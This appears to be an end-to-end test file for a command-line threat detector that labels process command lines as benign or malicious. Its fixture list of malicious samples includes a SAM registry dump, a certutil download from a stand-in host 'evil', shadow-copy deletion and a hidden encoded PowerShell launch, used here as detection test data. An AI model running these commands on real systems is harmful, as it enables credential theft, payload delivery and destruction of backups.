# tests/test_e2e.py
import csv, tempfile, os
from sentry.ingest import load_csv
from sentry.scoring import score_all
from sentry.pipeline import run_full

BENIGN = ["git status", "npm install", "ls -la", "python3 app.py", "docker ps",
          "cd /home", "cat README.md", "kubectl get pods", "echo hello", "pwd"]
MALICIOUS = ["reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
             "certutil -urlcache -f http://evil/x.exe x.exe",
             "vssadmin delete shadows /all /quiet",
             "powershell -nop -w hidden -enc SQBFAFgA"]

def _make_csv():
    fd, path = tempfile.mkstemp(suffix=".csv")
    with os.fdopen(fd, "w", newline="") as f:
        w = csv.writer(f); w.writerow(["process_name", "command_line", "label"])
        for c in BENIGN * 3:
            w.writerow(["proc", c, "benign"])
        for c in MALICIOUS:
            w.writerow(["proc", c, "malicious"])
    return path

def test_e2e_catches_all_known_malicious():
    path = _make_csv()
    rows = load_csv(path)
    scored = score_all(rows)
    _, verdicts = run_full(scored, target=4, client=None)
    mal = {v.row_id for v in verdicts if v.verdict == "malicious"}
    # the 4 malicious rows are the last 4 appended
    truth = set(range(len(rows) - 4, len(rows)))
    caught = len(mal & truth)
    assert caught >= 3, f"only caught {caught}/4"
    os.unlink(path)
